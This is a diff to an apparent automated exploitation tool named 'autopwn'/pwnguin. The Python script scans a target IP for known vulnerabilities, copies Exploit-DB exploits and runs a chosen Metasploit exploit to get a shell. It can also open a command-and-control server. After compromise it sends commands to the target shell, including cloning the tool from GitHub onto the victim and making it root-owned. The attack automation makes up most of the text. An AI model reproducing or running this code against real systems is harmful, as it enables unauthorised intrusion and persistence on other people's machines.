@@ -38,7 +38,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 1
+debug = 0
 
 
 def show_pwnguin():
@@ -70,7 +70,7 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
     """Scans IP loofing for vulnerabilities and output the
     related exploit list to be parsed (in json)
     """
-    if (debug == 0) :
+    if debug == 0:
         cmd = "./explookup.sh " + ip + " >> /dev/null"
         scan = subprocess.run(cmd, shell=True)
         if scan:
@@ -86,8 +86,9 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
     return result
 
 
+# TODO Définir une liste d'extensions dépréciées pour les exploit récupérés sur edb.
 def getEdbExploit(res=[]):
-    """ Retrieve EDB exploits that are missing in metasploit """
+    """Retrieve EDB exploits that are missing in metasploit"""
     edbExploits = []
     for search in res:
         edbExploits += search["RESULTS_EXPLOIT"]
@@ -99,9 +100,11 @@ def getEdbExploit(res=[]):
                 paths.append(pwn["Path"])
     if paths:
         for path in paths:
-            command = "cp " + path + " ./edb/" + str(path.split("/")[-1])
-            #    print(command)
-            subprocess.run(command, shell=True)
+            ext = str(path.split("/")[-1]).split(".")[-1]
+            if not (ext in ["txt", "md"]):
+                command = "cp " + path + " ./edb/" + str(path.split("/")[-1])
+                #    print(command)
+                subprocess.run(command, shell=True)
 
 
 def createExploitList(res=[]) -> tuple[list[str], list[str]]:
@@ -238,34 +241,83 @@ def getShell(client=None, id="1"):
         return -10
 
 
-def autopwn():
+def sendCommands(shell, sequence=[]) -> int:
+    """Automated interaction with shell on target"""
+    if len(sequence) == 0:
+        print("[X] Error 5 : Invalid sequence.")
+        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
+        return -5
+
+    for command in sequence:
+        print(command)
+        shell.write(command)
+        time.sleep(5)  # Todo : modifier le sleep
+        print(shell.read())
+    return 0
+
+
+def flushProcesses() -> int:
+    proc = subprocess.run(
+        "kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True
+    )
+    print(proc)
+    proc = subprocess.run(
+        "kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')", shell=True
+    )
+    print(proc)
+    return 0
+
+
+def autopwn(
+    generic_exploit=True,
+    get_edb_exploits=False,
+    com_and_cont=False,
+    auto_mode=False,
+) -> tuple[None, MsfRpcClient, str]:
+    """Autopwn function."""
     show_pwnguin()
-    
+
     results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
     (exploits, metaexploits) = createExploitList(results)
-    # getEdbExploit(results)
 
-    print("[~] Generic exploits :")
-    if exploits:
-        pprint.pprint(exploits)
-        print("\n")
+    if generic_exploit & get_edb_exploits:
+        getEdbExploit(results)
+
+    if generic_exploit:
+        if exploits:
+            print("[~] All exploits :")
+            pprint.pprint(exploits)
+            print("\n")
+        else:
+            LOG("Error 3 : No exploits found on EDB.", logfile, "err")
+            print("[X] Error 3 : No exploits found on EDB.")
+            exit(-3)
+        LOG("Displayed possible exploits to user", logfile, "log")
+
+        if metaexploits:
+            print("[~] Metasploit exploits :")
+            pprint.pprint(metaexploits)
+            print("\n")
+        else:
+            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
+            print("[i] INFO : No exploit found on Metasploit.")
+        LOG("Displayed possible exploits to user", logfile, "log")
     else:
-        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
-        print("[X] Error 3 : No exploit found on Metasploit.")
-        exit(-3)
-    LOG("Displayed possible exploits to user", logfile, "log")
+        if metaexploits:
+            print("[~] Metasploit exploits :")
+            pprint.pprint(metaexploits)
+            print("\n")
+        else:
+            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
+            print("[i] INFO : No exploit found on Metasploit.")
+        LOG("Displayed possible exploits to user", logfile, "log")
 
-    print("[~] Metasploit exploits :")
-    if metaexploits:
-        pprint.pprint(metaexploits)
-        print("\n")
+    if auto_mode:
+        choice = -1
+        print("[i] Automatic mode activated ! Selecting best exploit for you.")
     else:
-        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
-        print("[X] Error 3 : No exploit found on Metasploit.")
-        exit(-3)
-    LOG("Displayed possible exploits to user", logfile, "log")
+        choice = input("[~] Please select an exploit: ")
 
-    choice = input("[~] Please select an exploit: ")
     attack = selectExploit(choice, exploits)
 
     print("[V] Exploit selected ! :")
@@ -283,46 +335,31 @@ def autopwn():
 
     shell = getShell(client, "1")
 
-    print("[~] Entering command and control section")
-    LOG("Entered in C&C section", logfile, "inf")
+    if com_and_cont:
+        print("[~] Entering command and control section")
+        LOG("Entered in C&C section", logfile, "inf")
 
-    print("[~] Opening local C2 server ...")
-    (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
-    ipport = "http://192.168.1.86:" + str(port)
-
+        print("[~] Opening local C2 server ...")
+        (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
+        ipport = "http://192.168.1.86:" + str(port)
+    else:
+        ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
     return (shell, client, ipport)
-
-
-def sendCommands(shell, sequence=[]) -> int:
-    """Automated interaction with shell on target"""
-    if len(sequence) == 0:
-        print("[X] Error 5 : Invalid sequence.")
-        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
-        return -5
-
-    # if (shell == None):
-    #     print("[X] Error 6 : Invalid shell.")
-    #     LOG("[X] Error 6 : Invalid shell.", logfile, "err")
-    #     return -6
-
-    for command in sequence:
-        print(command)
-        shell.write(command)
-        time.sleep(5)  # Todo : modifier le sleep
-        print(shell.read())
-    return 0
 
 
 if __name__ == "__main__":
     if debug == 1:
         print("**** RUNNING IN DEBUG MODE ****")
 
+    flushProcesses()
 
     if len(sys.argv) > 1:
         IP = sys.argv[1]
 
-    (shell, client, srv) = autopwn()
+    (shell, client, srv) = autopwn(
+        generic_exploit=True, get_edb_exploits=True, com_and_cont=False, auto_mode=False
+    )
 
     sequence = [
         "whoami",
@@ -338,7 +375,7 @@ if __name__ == "__main__":
         "git clone https://github.com/kiso6/pwnguin",
         "chown root:root pwnguin",
         "cd pwnguin",
-        "chmod -R 700 ."
+        "chmod -R 700 .",
     ]
     sendCommands(shell, sequence)
 
